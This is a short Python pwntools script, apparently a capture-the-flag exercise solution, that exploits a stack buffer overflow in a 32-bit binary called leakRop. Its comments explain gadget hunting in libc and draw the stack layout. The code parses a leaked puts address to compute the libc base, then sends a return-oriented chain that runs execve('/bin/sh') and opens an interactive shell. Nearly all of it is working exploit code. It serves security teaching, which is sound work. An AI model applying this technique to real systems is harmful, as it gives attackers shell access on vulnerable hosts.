from pwn import *

# Notes
#  * This binary uses shared libraries instead of static libraries like `rop`
#  * Read up on shared libraries: https://github.com/TechSecCTF/CTF-pwn-tips/wiki/Shared-Libraries
#  * Once again, use ROPGadget to find the gadgets
#  * `ROPGadget --binary /lib/i386-linux-gnu/libc.so.6 > rop_gadgets`
#  * grep around in `rop_gadgets` for `int 0x80`, `pop e[abcd]x`
#  * Use pwntools to find `/bin/sh` and `puts` (this can also be done manually, see the wiki)
#
# Our stack looks like:
#
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA    .      |
#    | AAAA (buffer)  |
#    +----------------+
#    | BBBB (old ebp) |
#    +----------------+
#    | ret1 (popexx)  |
#    +----------------+
#    |    0 (edx)     |
#    +----------------+
#    |    0 (ecx)     |
#    +----------------+
#    | /bin/sh (ebx)  |
#    +----------------+
#    | ret2 (popeax)  |
#    +----------------+
#    |  0xb (eax)     |
#    +----------------+
#    |    syscall     |
#    ------------------

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
puts = libc.symbols['puts']
binsh = next(libc.search("/bin/sh"))

syscall = 0x0002e725
popeax  = 0x0002470f
popexx  = 0x000fb8e1


r = process('./leakRop')
r.recvline()
r.recvline()
x = r.recvline()

realputs = int(x[x.index('0x') + 2 :], 16)
offset = realputs - puts

binsh += offset
syscall += offset
popeax += offset
popexx += offset

ropchain = "A" * 32 + "B" * 4 + p32(popexx) + p32(0) + p32(0) + p32(binsh) + p32(popeax) + p32(0xb) + p32(syscall)

r.send(ropchain)
r.interactive()
